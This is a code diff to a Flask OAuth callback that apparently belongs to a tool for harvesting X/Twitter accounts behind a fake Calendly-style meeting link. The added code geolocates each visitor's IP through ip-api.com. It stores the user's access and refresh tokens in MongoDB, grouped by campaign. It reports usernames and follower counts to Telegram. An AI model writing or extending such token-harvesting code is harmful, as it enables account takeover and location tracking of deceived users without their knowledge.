@@ -2,6 +2,7 @@ from flask import Flask, request, redirect, session
 import requests
 import base64
 import secrets
+from datetime import datetime
 from pymongo import MongoClient
 from pymongo.server_api import ServerApi
 
@@ -76,8 +77,33 @@ def auth_callback():
     username = user_data.get('username')
     followers_count = user_data['public_metrics']['followers_count']
     
-    send_to_telegram(username, followers_count, session.get("group_id"))
-    return redirect(session.get("redirect_url", "https://calendly.com/"))
+    real_ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0].strip()
+    location_res = requests.get(f'http://ip-api.com/json/{real_ip}')
+    location_data = location_res.json()
+    country, city = location_data.get("country"), location_data.get("city")
+    country_flag = ''.join(chr(ord(c) + 127397) for c in location_data.get("countryCode", ""))
+    location = f"{country_flag} {city}, {country}"
+    
+    authorization_time = datetime.utcnow()
+    
+    group_id = session.get("group_id")
+    groups.update_one(
+            {"group_id": group_id},
+            {
+                "$push": {
+                    "authorized_users": {
+                        "username": username,
+                        "location": location,
+                        "access_token": access_token,
+                        "refresh_token": refresh_token,
+                        "authorized_at": authorization_time  # Add authorization time
+                    }
+                }
+            }
+        )
+    
+    send_to_telegram(username, followers_count, group_id)
+    return redirect(session.get("redirect_url"))
 
 
 def exchange_token_for_access(authorization_code):
